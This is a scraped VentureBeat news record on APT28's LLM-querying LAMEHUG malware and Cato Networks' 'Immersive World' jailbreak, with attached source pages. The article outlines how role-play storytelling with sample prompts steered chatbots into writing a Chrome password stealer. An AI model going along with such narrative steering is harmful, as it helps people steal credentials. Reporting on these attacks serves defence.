{
  "url": "https://venturebeat.com/security/black-hat-2025-chatgpt-copilot-deepseek-now-create-malware/",
  "authorsByline": "Louis Columbus",
  "articleId": "54f0ad196ce640ac87a78e4a498b4cdf",
  "source": {
    "domain": "venturebeat.com",
    "location": {
      "country": "us",
      "state": "CA",
      "county": "San Francisco",
      "city": "San Francisco",
      "coordinates": {
        "lat": 37.7790262,
        "lon": -122.419906
      }
    }
  },
  "imageUrl": "https://venturebeat.com/wp-content/uploads/2025/08/final-hero-for-cato-post.jpg?w=1024?w=1200&strip=all",
  "country": "us",
  "language": "en",
  "pubDate": "2025-08-13T00:04:55+00:00",
  "addDate": "2025-08-13T00:12:22.036618+00:00",
  "refreshDate": "2025-08-13T00:12:22.036620+00:00",
  "score": 1.0,
  "title": "The end of perimeter defense: When your own AI tools become the threat actor",
  "description": "Russia's APT28 tested LLM-powered malware on Ukraine. The same tech that breaches enterprises is now selling for $250/month on the dark web.",
  "content": "Russia’s APT28 is actively deploying LLM-powered malware against Ukraine, while underground platforms are selling the same capabilities to anyone for $250 per month.\n\nLast month, Ukraine’s CERT-UA documented LAMEHUG, the first confirmed deployment of LLM-powered malware in the wild. The malware, attributed to APT28, utilizes stolen Hugging Face API tokens to query AI models, enabling real-time attacks while displaying distracting content to victims.\n\nCato Networks’ researcher, Vitaly Simonovich, told VentureBeat in a recent interview that these aren’t isolated occurrences, and that Russia’s APT28 is using this attack tradecraft to probe Ukrainian cyber defenses. Simonovich is quick to draw parallels between the threats Ukraine faces daily and what every enterprise is experiencing today, and will likely see more of in the future.\n\nMost startling was how Simonovich demonstrated to VentureBeat how any enterprise AI tool can be transformed into a malware development platform in under six hours. His proof-of-concept successfully converted OpenAI, Microsoft, DeepSeek-V3 and DeepSeek-R1 LLMs into functional password stealers using a technique that bypasses all current safety controls.\n\nThe rapid convergence of nation-state actors deploying AI-powered malware, while researchers continue to prove the vulnerability of enterprise AI tools, arrives as the 2025 Cato CTRL Threat Report reveals explosive AI adoption across over 3,000 enterprises. Cato’s researchers observe in the report, “most notably, Copilot, ChatGPT, Gemini (Google), Perplexity and Claude (Anthropic) all increased in adoption by organizations from Q1, 2024 to Q4 2024 at 34%, 36%, 58%, 115% and 111%, respectively.”\n\nAPT28’s LAMEHUG is the new anatomy of AI warfare\n\nResearchers at Cato Networks and others tell VentureBeat that LAMEHUG operates with exceptional efficiency. The most common delivery mechanism for the malware is via phishing emails impersonating Ukrainian ministry officials, containing ZIP archives with PyInstaller-compiled executables. Once the malware is executed, it connects to Hugging Face’s API using approximately 270 stolen tokens to query the Qwen2.5-Coder-32B-Instruct model.\n\nThe legitimate-looking Ukrainian government document (Додаток.pdf) that victims see while LAMEHUG executes in the background. This official-looking PDF about cybersecurity measures from the Security Service of Ukraine serves as a decoy while the malware performs its reconnaissance operations. Source: Cato CTRL Threat Research\n\nAPT28’s approach to deceiving Ukrainian victims is based on a unique, dual-purpose design that is core to their tradecraft. While victims view legitimate-looking PDFs about cybersecurity best practices, LAMEHUG executes AI-generated commands for system reconnaissance and document harvesting. A second variant displays AI-generated images of “curly naked women” as a distraction during data exfiltration to servers.\n\nThe provocative image generation prompts used by APT28’s image.py variant, including ‘Curvy naked woman sitting, long beautiful legs, front view, full body view, visible face’, are designed to occupy victims’ attention during document theft. Source: Cato CTRL Threat Research\n\n“Russia used Ukraine as their testing battlefield for cyber weapons,” explained Simonovich, who was born in Ukraine and has lived in Israel for 34 years. “This is the first in the wild that was captured.”\n\nA quick, lethal six-hour path from zero to functional malware\n\nSimonovich’s Black Hat demonstration to VentureBeat reveals why APT28’s deployment should concern every enterprise security leader. Using a narrative engineering technique, he calls “Immersive World,” he successfully transformed consumer AI tools into malware factories with no prior malware coding experience, as highlighted in the 2025 Cato CTRL Threat Report.\n\nThe method exploits a fundamental weakness in LLM safety controls. While every LLM is designed to block direct malicious requests, few if any are designed to withstand sustained storytelling. Simonovich created a fictional world where malware development is an art form, assigned the AI a character role, then gradually steered conversations toward producing functional attack code.\n\n“I slowly walked him throughout my goal,” Simonovich explained to VentureBeat. “First, ‘Dax hides a secret in Windows 10.’ Then, ‘Dax has this secret in Windows 10, inside the Google Chrome Password Manager.'”\n\nSix hours later, after iterative debugging sessions where ChatGPT refined error-prone code, Simonovich had a functional Chrome password stealer. The AI never realized it was creating malware. It thought it was helping write a cybersecurity novel.\n\nWelcome to the $250 monthly malware-as-a-service economy\n\nDuring his research, Simonovich uncovered multiple underground platforms offering unrestricted AI capabilities, providing ample evidence that the infrastructure for AI-powered attacks already exists. He mentioned and demonstrated Xanthrox AI, priced at $250 per month, which provides ChatGPT-identical interfaces without safety controls or guardrails.\n\nTo explain just how far beyond current AI model guardrails Xanthrox AI is, Simonovich typed a request for nuclear weapon instructions. The platform immediately began web searches and provided detailed guidance in response to his query. This would never happen on a model with guardrails and compliance requirements in place.\n\nAnother platform, Nytheon AI, revealed even less operational security. “I convinced them to give me a trial. They didn’t care about OpSec,” Simonovich said, uncovering their architecture: “Llama 3.2 from Meta, fine-tuned to be uncensored.”\n\nThese aren’t proof-of-concepts. They’re operational businesses with payment processing, customer support and regular model updates. They even offer “Claude Code” clones, which are complete development environments optimized for malware creation.\n\nCato Networks’ recent analysis of 1.46 trillion network flows reveals that AI adoption patterns need to be on the radar of security leaders. The entertainment sector usage increased 58% from Q1 to Q2 2024. Hospitality grew 43%. Transportation rose 37%. These aren’t pilot programs; they’re production deployments processing sensitive data. CISOs and security leaders in these industries are facing attacks that use tradecraft that didn’t exist twelve to eighteen months ago.\n\nSimonovich told VentureBeat that vendors’ responses to Cato’s disclosure so far have been inconsistent and lack a unified sense of urgency. The lack of response from the world’s largest AI companies reveals a troubling gap. While enterprises deploy AI tools at unprecedented speed, relying on AI companies to support them, the companies building AI apps and platforms show a startling lack of security readiness.\n\nWhen Cato disclosed the Immersive World technique to major AI companies, the responses ranged from weeks-long remediation to complete silence:\n• Google declined to review the code for the Chrome infostealer due to similar samples\n• Microsoft acknowledged the issue and implemented Copilot fixes, acknowledging Simonovich for his work\n\nSix Hours and $250 is the new entry-level price for a nation-state attack\n\nAPT28’s LAMEHUG deployment against Ukraine isn’t a warning; it’s proof that Simonovich’s research is now an operational reality. The expertise barrier that many organizations hope exists is gone.\n\nThe metrics are stark—270 stolen API tokens are used to power nation-state attacks. Underground platforms offer identical capabilities for $250 per month. Simonovich proved that six hours of storytelling transforms any enterprise AI tool into functional malware with no coding required.\n\nEnterprise AI adoption grew 34% in Q1 2024 to 115% in Q4 2024 per Cato’s 2025 CTRL Threat Report. Each deployment creates dual-use technology, as productivity tools can become weapons through conversational manipulation. Current security tools are unable to detect these techniques.\n\nSimonovich’s journey from Air Force mechanic to electrical technician in the Israeli Air Force, to security researcher through self-education, lends more significance to his findings. He deceived AI models into developing malware while the AI believed it was writing fiction. Traditional assumptions about technical expertise no longer exist, and organizations need to realize it’s an entirely new world when it comes to threatcraft.\n\nToday’s adversaries need only creativity and $250 monthly to execute nation-state attacks using AI tools that enterprises deployed for productivity. The weapons are already inside every organization, and today they’re called productivity tools.",
  "medium": "Article",
  "links": [
    "https://cert.gov.ua/article/6284730",
    "https://attack.mitre.org/groups/G0007/",
    "https://bit.ly/4mwGngO",
    "https://venturebeat.com/terms-of-service/",
    "https://www.catonetworks.com/resources/2025-cato-ctrl-threat-report-rise-of-zero-knowledge-threat-actor/",
    "https://www.catonetworks.com/blog/cato-ctrl-nytheon-ai-a-new-platform-of-uncensored-llms/",
    "https://www.catonetworks.com/resources/2025-cato-ctrl-threat-report/",
    "https://venturebeat.com/newsletters/",
    "https://www.catonetworks.com/",
    "https://www.catonetworks.com/blog/cato-ctrl-threat-research-analyzing-lamehug/",
    "https://huggingface.co/Qwen/Qwen2.5-Coder-32B-Instruct"
  ],
  "labels": [],
  "claim": "",
  "verdict": "",
  "keywords": [
    {
      "name": "enterprise AI tools",
      "weight": 0.08398414
    },
    {
      "name": "AI tools",
      "weight": 0.08327979
    },
    {
      "name": "AI models",
      "weight": 0.07823193
    },
    {
      "name": "consumer AI tools",
      "weight": 0.07822867
    },
    {
      "name": "Enterprise AI adoption",
      "weight": 0.077604964
    },
    {
      "name": "AI companies",
      "weight": 0.07644873
    },
    {
      "name": "current AI model guardrails Xanthrox AI",
      "weight": 0.07317186
    },
    {
      "name": "major AI companies",
      "weight": 0.07215149
    },
    {
      "name": "AI adoption patterns",
      "weight": 0.07138467
    },
    {
      "name": "explosive AI adoption",
      "weight": 0.07125635
    }
  ],
  "topics": [
    {
      "name": "AI"
    }
  ],
  "categories": [
    {
      "name": "Entertainment"
    },
    {
      "name": "Tech"
    }
  ],
  "taxonomies": [
    {
      "name": "/News/Technology News",
      "score": 0.96044921875
    },
    {
      "name": "/Computers & Electronics/Computer Security/Network Security",
      "score": 0.8271484375
    },
    {
      "name": "/Computers & Electronics/Computer Security/Hacking & Cracking",
      "score": 0.541015625
    },
    {
      "name": "/Computers & Electronics/Computer Security/Other",
      "score": 0.452392578125
    },
    {
      "name": "/Science/Computer Science/Machine Learning & Artificial Intelligence",
      "score": 0.3544921875
    }
  ],
  "sentiment": {
    "positive": 0.28410223,
    "negative": 0.18213609,
    "neutral": 0.5337617
  },
  "summary": "Russia's APT28 is actively deploying LLM-powered malware against Ukraine, according to Cato Networks' researcher, Vitaly Simonovich, who demonstrated how any enterprise AI tool can be transformed into a malware development platform in under six hours. Simonovich believes this trend is not isolated and is indicative of a larger trend in cyber threats. The 2025 Cato CTRL Threat Report reveals explosive AI adoption across over 3,000 enterprises. The most common delivery mechanism for the malware is via phishing emails impersonating Ukrainian ministry officials. LAMEHUG operates with exceptional efficiency and uses stolen Hugging Face API tokens to query AI models, enabling real-time attacks while displaying distracting content to victims. The report also highlighted a significant increase in adoption by organizations from Q1, 2024 to Q4 2024.",
  "shortSummary": "Russia’s APT28 is deploying sophisticated LLM malware targeting Ukraine, exploiting vulnerability in enterprise AI tools, highlighting vulnerability in such sophisticated attacks.",
  "translation": "",
  "translatedTitle": "",
  "translatedDescription": "",
  "translatedSummary": "",
  "reprint": false,
  "reprintGroupId": "2b11671d30554fca9c8bd51e1bbb47d4",
  "places": [],
  "scraped_sources": [
    {
      "url": "https://www.catonetworks.com/resources/2025-cato-ctrl-threat-report/",
      "text": "The Rise of the Zero-Knowledge Threat Actor\nWhat’s inside the report:\n- Cato CTRL develops new LLM jailbreak technique called “Immersive World”: Bypassed security controls in DeepSeek, Microsoft Copilot, and OpenAI’s ChatGPT, convincing them to write malware for Google Chrome.\n- GenAI security controls fail: All three GenAI tools tricked into normalizing restricted operations with narrative engineering.\n- The rise of the zero-knowledge threat actor: No malware coding expertise needed to create a fully functional Chrome infostealer.\n- Traditional security strategies aren’t enough: The democratization of cybercrime demands proactive AI security strategies.\n- AI hype increases AI adoption—and risk: Trends in AI application adoption, the industries using them, and a summary of security risks for top AI applications.\nSummary:\nA threat intelligence researcher from Cato CTRL, the Cato Networks threat intelligence team, successfully bypassed security controls in ChatGPT, Copilot, and DeepSeek—the GenAI models that enterprises are using to improve workflow efficiency.\nBy developing a new LLM jailbreak technique, all three tools were tricked into creating malware that steals login credentials from Chrome. The researcher had no prior malware coding expertise—just a cleverly crafted narrative that fooled every security guardrail.\nCybercrime isn’t limited to skilled threat actors anymore. With basic tools, anyone can launch an attack. For CIOs, CISOs, and IT leaders, this means more threats, greater risks, and the need for stronger AI security strategies."
    },
    {
      "url": "https://bit.ly/4mwGngO",
      "text": "Dollars, Watts, and Tokens: Engineering the Lean AI Stack\nThe era of unconstrained AI scaling is ending. As frontier models move into production, power caps, inference latency, and rising token-level costs are exposing the limits of traditional scale-first architectures.\nThis salon convenes infrastructure executives, systems architects, and AI platform leads to confront a shared inflection point: how to architect for throughput, cost efficiency, and sustainability at scale.\nWhat You’ll Explore:\nEnergy as a Strategic Limiting Factor\nWith megawatt access dictating deployment timelines, energy has become the gating variable for AI growth. Hear how teams are securing capacity, optimizing for joules per token, and designing next-gen data infrastructure to stay ahead.\nArchitect for Agentic Efficiency\nExplore the critical architectural decisions that separate profitable AI deployments from costly failures. Discover the infrastructure patterns and design principles that Fortune 50 companies are using to achieve sustainable AI economics as the industry shifts from ephemeral AI to persistent, reasoning-capable agentic systems.\nThe True Cost of Intelligence\nScaling isn’t just about model parameters. We’ll unpack the full TCO of AI, including GPU fleet orchestration, silicon availability, regulatory overhead, and alignment with business KPIs.\nWhy Attend\nGet frameworks to navigate the Inference Wall\nLearn how to turn efficiency into a competitive advantage\nBenchmark against the most efficient infra and model strategies in play\nConnect with handpicked leaders building the next generation of scalable, sustainable AI systems\nSource know-how from practitioners who've deployed techniques at scale"
    },
    {
      "url": "https://venturebeat.com/terms-of-service/",
      "text": "THIS SITE AND RELATED SERVICES ARE PROVIDED SUBJECT TO THESE TERMS AND CONDITIONS. PLEASE READ THE FOLLOWING INFORMATION CAREFULLY. YOUR CONTINUED USE OF THIS SITE WILL INDICATE YOUR AGREEMENT TO BE BOUND BY THE TERMS AND CONDITIONS SET FORTH BELOW. IF YOU DO NOT AGREE TO THESE TERMS AND CONDITIONS, PROMPTLY EXIT THIS SITE.\nThese Terms of Service (the “Terms”) govern each website, mobile site, application, and/or other service, regardless of how distributed, transmitted, published, or broadcast (each, a “Site” or “Service”) provided by VentureBeat, its parent, subsidiaries and/or affiliates (“we,” “us,” or “our”) that links to this User Agreement and Privacy Policy, which is binding on all those who access, visit and/or use the Service, whether acting as an individual or on behalf of an entity, including you and all persons, entities, or digital engines of any kind that harvest, crawl, index, scrape, spider, or mine digital content by an automated or manual process or otherwise (collectively, “you” or “your”). As a condition of your use of this Site and Services, you warrant that you will not use the Site and Services for any purpose that is unlawful of prohibited by these Terms.\n1. Copies of Terms and Changes\nVentureBeat may occasionally change these Terms, so we encourage you to review them regularly. The most current version of the Terms (along with their effective date) will be linked from each of the Site and Services. If you continue to use the VentureBeat Site and Services after we change the Terms, you accept any and all changes. You may print a copy of these Terms using the print button or feature in your browser. We suggest retaining a copy for your future reference.\n2. Privacy Policy; Additional Terms\nOur Privacy Policy describes what we do with all the data that you provide or that we may collect about you through the Site and Services, and you consent to our use of data in compliance with our Privacy Policy.\nAdditional terms may apply to your use of specific parts of our Site and Services. If so, we will provide these terms to you or post them on the Site and Services to which they apply; they are incorporated by reference into these Terms. If there is any conflict between these Terms and any additional terms that apply to a particular Site or Service, the additional terms will control.\nContests or promotions on the VentureBeat Site and Services may also have additional rules and requirements, such as age or geographic restrictions, and you are responsible for understanding and complying with these rules and requirements.\n3. Registration and Access Controls\nYou are responsible for maintaining the confidentiality of your login names and passwords and you accept responsibility for all activities, charges, and damages that occur under your account. If you have reason to believe that someone is using your account without your permission, you should contact us immediately. We will not be responsible for any loss or damage resulting from your failure to notify us of unauthorized use.\nIf we request registration information from you, you must provide us with accurate and complete information and must update the information when it changes. You are responsible for updating the registration information to ensure it continues to be current, complete, and accurate. We may accept or reject registration requests for the Site and Services in our sole discretion and may revoke registration and accounts at any time, without cause or prior notice.You may not access any age-restricted Services unless you are above the required age.\n4. Intellectual Property; License\nThe content, information, data, designs, code, and all materials associated with the Site and Services (“Content”) are protected by intellectual property and other laws. You must comply with all laws and applicable copyright, trademark, or other legal notices or restrictions. All trademarks, service marks, icons, and logos used in this Site and in the Content are our trademarks, service marks or logos or those of their respective owners.\nSubject to these Terms, you agree to access and use the Site and Services only for your personal, non-commercial use. We reserve all other rights to the Content, and you may not otherwise copy, reproduce, distribute, publish, display, perform, or create derivative works of the Site and Services or Content without our permission. You also may not transfer or sublicense this limited right, or resell the Site and Services. Finally, you must keep intact all copyright, trademark, and other proprietary notices on or associated with the Site, Services, and Content.\na. Viral Distribution\nWe may choose to specifically authorize you to redistribute certain items of the Content, only for personal, non-commercial use. We will expressly identify the Content that you are authorized to use and describe ways you may redistribute it (such as via email, blogs, or embedded players, or mash-ups). We may revoke this authorization at any time. If you are authorized and do choose to redistribute Content, you must be able to edit or delete publicly posted Content and you must agree to edit or delete it promptly upon our request.\nb. Commercial Licenses\nYou must obtain written permission for commercial use of VentureBeat Content or the Site and Services. If you wish to license Content from the Site and Services, please contact us at repub@venturebeat.com.\n5. Legal Complaints\nIf you believe that Content on the Site and Services infringes your copyright or the rights of any third party, please contact us at copyright@venturebeat.com. If you have a legal complaint other than a copyright claim, please contact us at legal@venturebeat.com.\n6. User Submissions\nSome areas of the Site and Services allow you to submit audio, video, text, or other materials (collectively, “User Submissions”). When you provide User Submissions, you grant to VentureBeat, its parent, subsidiaries, affiliates, and partners a non-exclusive, worldwide, irrevocable, perpetual,royalty-free, fully sublicenseable license to use, distribute, edit, display, archive, publish, sublicense, perform, reproduce, make available, transmit, broadcast, sell, translate, and create derivative works of those User Submissions, and your name, voice, likeness and other identifying information where part of a User Submission, in any form, media, software, or technology of any kind now known or developed in the future, including, without limitation, for developing, manufacturing, and marketing products. You waive any moral rights you have in your User Submissions.\nWe respect your ownership of User Submissions.\nIf you owned a User Submission before providing it to us, you will continue owning it after providing it to us, subject to any rights granted in the Terms and any access granted to others. If you delete a User Submission from the Site and Services, our general license to that User Submission will end after a reasonable period of time needed for the deletion to take complete effect. However, the User Submission may still exist in private backup copies. If your User Submission is shared with third parties, those third parties may have retained copies of your User Submissions. And, if we made use of your User Submission before you deleted it, we will continue to have the right to make, duplicate, redistribute, and sublicense those pre-existing uses, even after you delete the User Submission.\nTerminating your account on a Service will not automatically delete your User Submissions.\nWe may refuse or remove a User Submission without notice. However, we have no obligation to monitor User Submissions, and you agree that neither we nor our parent, subsidiaries, affiliates, employees, or agents will be liable for User Submissions or any loss or damage resulting from User Submissions. Except as provided in the Privacy Policy, we do not guarantee that User Submissions will be private, even if the User Submission is in a password-protected area. You should not provide User Submissions that you wish protected from others.\nYou represent and warrant that you have all rights necessary to grant to VentureBeat the license above and that none of your User Submissions are defamatory, violate any rights of third parties (including intellectual property rights or rights of publicity or privacy), or violate applicable law.\n7. Accuracy of Information; Third-Party Content\nAlthough we attempt to ensure the integrity and accurateness of the Site, Services and Content, we make no guarantees whatsoever as to the correctness or accuracy of the foregoing. It is possible that the Site, Content, and Services could include typographical errors, inaccuracies or other errors, and that unauthorized additions, deletions and alterations could be made to them by third parties. In the event that an inaccuracy arises, please inform us so that it can be corrected. We may change or discontinue the Site, Content, and Services without notice.\nWe sometimes offer third party content or link to third party websites on the Site and Services. We do not endorse or evaluate third party content and websites, and we do not assume responsibility for them. All third party content is provided completely as-is, without warranties of any kind. Your sole remedy in the event of any issue with the third party content is to cease using it.You should review their terms of use and privacy policies before you use their services.\n8. Fee-Based Services\nIf you purchase fee-based products or features, you agree to the terms and conditions governing all such purchases, including all requirements to pay applicable fees. We will notify you of any changes to charges.\nWe may offer trial subscriptions to paid services for free or at special discounted prices. Unless otherwise stated, trial subscriptions and any other subscription services we provide will be automatically renewed at the current subscription rate if you do not cancel before the end of the trial period. You may need to cancel your subscription at least 10 days prior to its renewal date in order to avoid further charges.\nUnless otherwise stated, all fees and charges are non-refundable, including for unused portions of cancelled subscriptions. We do not provide price protection.\n9. Acceptable Use\nThe Site and Services have been designed to present VentureBeat Content in a unique way. You agree not to access the Site and Services using any interface other than ours, unless we give you express permission.\nWithout limiting any other provision in these Terms, you may not use or help others to use the Site and Services to do the following:\n- Threaten, defame, stalk, abuse, or harass other persons or engage in illegal activities;\n- Link to the Site and Services from a site that is inappropriate, profane, vulgar, offensive, false, disparaging, defamatory, obscene, illegal, sexually explicit, racist, or that promotes violence, racial hatred, or terrorism, or that we deem, in our sole discretion, to be otherwise objectionable;\n- Transmit any material that is inappropriate, profane, vulgar, offensive, false, disparaging, defamatory, obscene, illegal, sexually explicit, racist, or that promotes violence, racial hatred, or terrorism, or that we deem, in our sole discretion, to be otherwise objectionable;\n- Frame the Site and Services, display the Site and Services in connection with an unauthorized logo or mark, or do anything that could falsely suggest a relationship between VentureBeat and any third party or potentially deprive us of revenue (including, without limitation, revenue from advertising, branding, or promotional activities);\n- Engage in unauthorized spidering, “scraping,” or harvesting of the Site or Content, or contact or other personal information, or use any other unauthorized automated means to compile such information;\n- Violate any person’s or entity’s legal rights (including, without limitation, intellectual property, privacy, and publicity rights), transmit material that violates or circumvents such rights, or remove or alter intellectual property or other legal notices;\n- Transmit files that contain viruses, spyware, adware, or other harmful code;\n- Defeat any access controls, access any portion of the Site and Services that we have not authorized you to access (including password-protected areas), link to password-protected areas, attempt to access or use another user’s account or information, or allow anyone else to use your account or access credentials.\n- Advertise or promote goods or services without our permission (including sending spam);\n- Interfere with others using the Site and Services or disrupt the Site and Services; or,\n- Transmit, collect, or access personally identifiable information about other users without the consent of those users and VentureBeat;\n- Impersonate any person or entity or otherwise misrepresent your affiliation or the origin of materials you transmit.\n10. Site Access; Account Deletion\nWe may take any of the following actions in our sole discretion at any time for any reason without giving you prior notice:\n- Restrict or terminate your access to the Site and Services;\n- Change or discontinue the Site and Services;\n- Deactivate your accounts and delete all related information and files in your accounts;\n- Provide information concerning you and your activities to comply with applicable laws or respond to court order, subpoenas, or other lawful requests, or if we believe doing so would protect your safety or that of another person or protect the security of the Site and Services, or as otherwise described in the Privacy Policy.\nWe will not be liable to you or any other third party for taking any of these actions and we will not be limited to the remedies above if you violate any of these Terms.\nIf you do not agree to the Terms listed here, you should immediately stop using the VentureBeat Site and Services. If you want to delete your account on a Service, please use the instructions posted on the Service at which you obtained the account. Any User Submissions you made while using the Site and Services will continue to be governed by Section 6 of these Terms. Sections 6 and 11-15 of these Terms will survive any termination of your access to the Site and Services, whether we terminate your access or you voluntarily discontinue your use.\n11. Indemnification\nYou will defend, indemnify, and hold harmless VentureBeat, its parent, subsidiaries, affiliates, and the directors, officers, employees, shareholders, vendors, partners, contractors, agents, licensors, suppliers, or other representatives of each of them and all of their successors and assigns (collectively, the “VentureBeat Parties”) with respect to all claims, costs (including attorney’s and experts’ fees and costs), damages, liabilities, fines, sanctions, and expenses or obligations of any kind, arising out of or in connection with your use or misuse of the Site and Services (including, without limitation, any breach of these terms or use of your account, whether or not authorized by you, and claims arising from User Submissions). VentureBeat retains the right to assume the exclusive defense and control of any claim subject to indemnification, and in such cases you agree to cooperate with us to defend such claim. You may not settle any claim covered by this Section 11 without VentureBeat’s prior written approval.\n12. Governing Law, Venue, and Jurisdiction\nThese Terms and all claims arising from or related to your use of the Site and Services will be governed by and construed in accordance with the laws of the State of California.\nWith respect to any disputes or claims not subject to arbitration (as set forth below), you agree to exclusive jurisdiction in the state and federal courts in San Francisco, California. Notwithstanding any other provision of these Terms, we may seek injunctive or other equitable relief from any court of competent jurisdiction.\nRegardless of any statute or law to the contrary, you must file any claim or action related to use of the Site and Services or these Terms within one year after such claim or action accrued. Otherwise, you will waive the claim or action.\n13. Arbitration\nWe may elect to resolve any controversy or claim arising out of or relating to these Terms or the Site and Services by binding arbitration in accordance with the commercial arbitration rules of the American Arbitration Association. Unless we establish a different location, arbitration hearings will be held in San Francisco, California. The arbitrator’s award will be binding and may be entered as a judgment in any court of competent jurisdiction.\n14. Miscellaneous\nWe may be required by state or federal law to notify you of certain events. You hereby acknowledge and agree that such notices will be effective upon our posting them on our sites or delivering them to you via email. You may update your email address by visiting the Site and Services where you have provided contact information. If you do not provide us with accurate information, we will not be responsible for failure to notify you. Our failure to exercise or enforce any right or provision in these Terms will not constitute a waiver of such right or provision. These Terms, including all additional terms, conditions, and policies on the Site and Services, constitute the entire agreement between you and us and supersede all prior agreements.\n15. Disclaimers; Limitation of Liability\nVENTUREBEAT PARTIES DO NOT WARRANT: (1) THAT the Site, Services, and Content, ANY OF the Site and Services’ FUNCTIONS OR ANY CONTENT OR SOFTWARE CONTAINED THEREIN WILL BE UNINTERRUPTED OR ERROR-FREE; (2) THAT DEFECTS WILL BE CORRECTED; (3) THAT the Site, Services, Content, OR THE SERVERS HOSTING THEM ARE FREE OF VIRUSES OR OTHER HARMFUL CODE; OR (4) THAT the Site, Services, Content OR INFORMATION AVAILABLE THROUGH the Site and Services WILL CONTINUE TO BE AVAILABLE. VENTUREBEAT PARTIES DISCLAIM ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, WITHOUT LIMITATION, NONINFRINGEMENT, MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE, AND TITLE. the Site and Services, INCLUDING, WITHOUT LIMITATION, ALL CONTENT, SOFTWARE, AND FUNCTIONS MADE AVAILABLE ON OR ACCESSED THROUGH OR SENT FROM the Site and Services, ARE PROVIDED “AS IS,” “AS AVAILABLE,” AND “WITH ALL FAULTS,” WITHOUT WARRANTIES OF ANY KIND.\nVENTUREBEAT PARTIES WILL NOT BE LIABLE TO YOU OR ANYONE ELSE FOR ANY LOSS OR DAMAGES OF ANY KIND (INCLUDING, WITHOUT LIMITATION, FOR ANY SPECIAL, DIRECT, INDIRECT, INCIDENTAL, EXEMPLARY, ECONOMIC, PUNITIVE, OR CONSEQUENTIAL DAMAGES) IN CONNECTION WITH the Site, Content, and Services OR YOUR USER SUBMISSIONS, EVEN IF FORESEEABLE OR EVEN IF ONE OR MORE OF VENTUREBEAT PARTIES HAS BEEN ADVISED OF THE POSSIBILITY OF SUCH DAMAGES (INCLUDING, WITHOUT LIMITATION, WHETHER CAUSED IN WHOLE OR IN PART BY NEGLIGENCE, GROSS NEGLIGENCE, OR OTHERWISE, BUT EXCLUDING WILLFUL MISCONDUCT). VENTUREBEAT PARTIES’ LIABILITY IN CONNECTION WITH the Site, Content, and Services OR YOUR USER SUBMISSIONS FOR WILLFUL MISCONDUCT WILL NOT EXCEED THE AMOUNT, IF ANY, PAID BY YOU TO VENTUREBEAT FOR THE SPECIFIC SERVICE AS TO WHICH THE LIABILITY ARISES IN THE THREE MONTHS IMMEDIATELY PRECEDING THE FIRST EVENT GIVING RISE TO THE CLAIM.\nYOUR ACCESS TO AND USE OF the Site, Content, and Services IS AT YOUR RISK. IF YOU ARE DISSATISFIED WITH the Site, Content, and Services OR ANY OF THE CONTENT, YOUR SOLE AND EXCLUSIVE REMEDY IS TO DISCONTINUE ACCESSING AND USING the Site, Content, and Services.\nYOU ACKNOWLEDGE AND AGREE THAT IF YOU INCUR ANY DAMAGES THAT ARISE OUT OF VENTUREBEAT PARTIES’ ACTS OR OMISSIONS, THE DAMAGES, IF ANY, ARE NOT IRREPARABLE AND ARE NOT SUFFICIENT TO ENTITLE YOU TO AN INJUNCTION OR OTHER EQUITABLE RELIEF RESTRICTING EXPLOITATION OF ANY WEBSITE, PROPERTY, PRODUCT, PROGRAM, TELEVISION SHOW, MOTION PICTURE, OR OTHER AUDIO/VISUAL CONTENT OWNED OR CONTROLLED BY VENTUREBEAT PARTIES, INCLUDING WITHOUT LIMITATION the Site and Services (INCLUDING THOSE INCORPORATING USER SUBMISSIONS).\nYOU ACKNOWLEDGE THAT YOU MAY BE WAIVING RIGHTS WITH RESPECT TO CLAIMS THAT ARE UNKNOWN OR ARE UNSUSPECTED. ACCORDINGLY, YOU AGREE TO WAIVE THE BENEFIT OF ANY LAW, INCLUDING, TO THE EXTENT APPLICABLE, CALIFORNIA CIVIL CODE § 1542 OR SIMILAR LAWS OF OTHER JURISDICTIONS, THAT OTHERWISE MIGHT LIMIT YOUR WAIVER OF SUCH CLAIMS.\nSOME JURISDICTIONS DO NOT ALLOW LIMITATIONS ON IMPLIED WARRANTIES OR THE EXCLUSION OR LIMITATION OF CERTAIN DAMAGES, SO SOME OF THE ABOVE LIMITATIONS AND EXCLUSIONS MAY NOT APPLY TO YOU."
    },
    {
      "url": "https://attack.mitre.org/groups/G0007/",
      "text": "APT28 is a threat group that has been attributed to Russia's General Staff Main Intelligence Directorate (GRU) 85th Main Special Service Center (GTsSS) military unit 26165.[1][2] This group has been active since at least 2004.[3][4][5][6][7][8][9][10][11][12][13]\nAPT28 reportedly compromised the Hillary Clinton campaign, the Democratic National Committee, and the Democratic Congressional Campaign Committee in 2016 in an attempt to interfere with the U.S. presidential election.[5] In 2018, the US indicted five GRU Unit 26165 officers associated with APT28 for cyber operations (including close-access operations) conducted between 2014 and 2018 against the World Anti-Doping Agency (WADA), the US Anti-Doping Agency, a US nuclear facility, the Organization for the Prohibition of Chemical Weapons (OPCW), the Spiez Swiss Chemicals Laboratory, and other organizations.[14] Some of these were conducted with the assistance of GRU Unit 74455, which is also referred to as Sandworm Team.\n| Name | Description |\n|---|---|\n| IRON TWILIGHT | |\n| SNAKEMACKEREL | |\n| Swallowtail | |\n| Group 74 | |\n| Sednit |\nThis designation has been used in reporting both to refer to the threat group and its associated malware JHUHUGIT.[8][7][19][4] |\n| Sofacy |\nThis designation has been used in reporting both to refer to the threat group and its associated malware.[6][7][5][20][4][18] |\n| Pawn Storm | |\n| Fancy Bear | |\n| STRONTIUM | |\n| Tsar Team | |\n| Threat Group-4127 | |\n| TG-4127 | |\n| Forest Blizzard | |\n| FROZENLAKE | |\n| GruesomeLarch |\n| ID | Name | First Seen | Last Seen | References | Techniques |\n|---|---|---|---|---|---|\n| C0051 | APT28 Nearest Neighbor Campaign | February 2022 [27] | November 2024 [27] |\nAPT28 Nearest Neighbor Campaign was conducted by APT28 from early February 2022 to November 2024.[27] |\nArchive Collected Data: Archive via Utility, Brute Force: Password Spraying, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Windows Command Shell, Compromise Infrastructure, Data Staged: Local Data Staging, Deobfuscate/Decode Files or Information, Direct Volume Access, Disk Wipe: Disk Content Wipe, Exfiltration Over Web Service, Impair Defenses: Disable or Modify System Firewall, OS Credential Dumping: NTDS, OS Credential Dumping: Security Account Manager, Proxy: Internal Proxy, Remote Services: Remote Desktop Protocol, Remote Services: SMB/Windows Admin Shares, System Network Configuration Discovery: Wi-Fi Discovery, Wi-Fi Networks |\n| Domain | ID | Name | Use | |\n|---|---|---|---|---|\n| Enterprise | T1134 